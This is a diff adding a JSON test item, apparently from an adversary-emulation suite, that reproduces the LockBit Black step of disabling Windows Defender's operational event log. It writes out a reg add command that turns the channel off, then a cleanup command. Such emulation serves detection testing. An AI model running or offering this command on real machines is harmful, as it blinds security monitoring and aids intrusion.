@@ -1,0 +1,44 @@
+{
+  "id": "f6df0b8e-2c83-44c7-ba5e-0fa4386bec41",
+  "name": "LockBit Black - Disable the ETW Provider of Windows Defender -cmd",
+  "description": "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\nhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "d30466ae-871e-4147-b437-36c3e536c4c4",
+      "type": "execute-command",
+      "data": {
+        "command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" /v Enabled /t REG_DWORD /d 0 /f\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "bd24a9d0-70ee-458b-87c5-e47565802a66",
+      "type": "execute-command",
+      "data": {
+        "command": "reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" /v Enabled /f \u003enul 2\u003e\u00261\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "d30466ae-871e-4147-b437-36c3e536c4c4",
+      "p": "on-success",
+      "o": "bd24a9d0-70ee-458b-87c5-e47565802a66"
+    },
+    {
+      "s": "d30466ae-871e-4147-b437-36c3e536c4c4",
+      "p": "on-failure",
+      "o": "bd24a9d0-70ee-458b-87c5-e47565802a66"
+    }
+  ],
+  "tags": [
+    "T1562.006",
+    "atomic-red-team"
+  ]
+}
